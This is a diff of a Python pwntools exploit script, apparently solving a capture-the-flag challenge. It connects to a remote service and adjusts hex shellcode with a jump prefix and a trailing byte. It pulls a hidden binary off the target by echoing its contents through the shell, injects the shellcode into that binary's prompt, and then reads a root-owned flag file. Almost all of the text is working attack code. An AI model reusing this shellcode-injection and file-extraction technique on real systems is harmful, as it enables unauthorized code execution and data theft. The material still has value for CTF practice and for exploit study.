@@ -15,6 +15,7 @@ p = remote(addr,port)
 
 ### shellcode
 hexx = """
+eb 01 1a
 6a 53               
 58                  
 6a 2e               
@@ -66,35 +67,30 @@ shellcode = ''.join(b).replace(" ","")
 CHAR = ""
 
 def command(c):
-    p.recvuntil(CHAR)
     p.sendlineafter(CHAR, c)
 
 def grab_file():
     tag=b"ENDDDDDDDDDDD"
     command(b"echo -n \"$(<.admin_check)\""+tag)
-    byt = p.recvuntil(tag, drop=True)[1:]
+    byt = p.recvuntil(tag, drop=True)
     with open("test", "wb") as f:
         f.write(byt)
 
 def pwn():
     sh = binascii.unhexlify(shellcode)
-    with open("SHELL", "wb") as f:
-        f.write(sh+b"\n")
-    command(".admin_check")
-    p.sendafter("Enter your shellcode:", sh+b"\n")
-
-
+    command("./.admin_check")
+    p.sendafter("PRINT?", sh+b"\x1a"+b"\n")
 
 if __name__ == "__main__":
-    CHAR = "%"
+    CHAR = ">"
     #setup directory
     command("cd bin")  
     #grab bin data
-    #grab_file()
+    grab_file()
     #run exploit!
     pwn()
     #grab flag!
-    p.sendlineafter("now...","cat /home/rooted/flag.txt")
+    p.sendlineafter("糟糕!","cat /home/rooted/flag.txt")
     p.recvline()
     print(p.recvline())
 
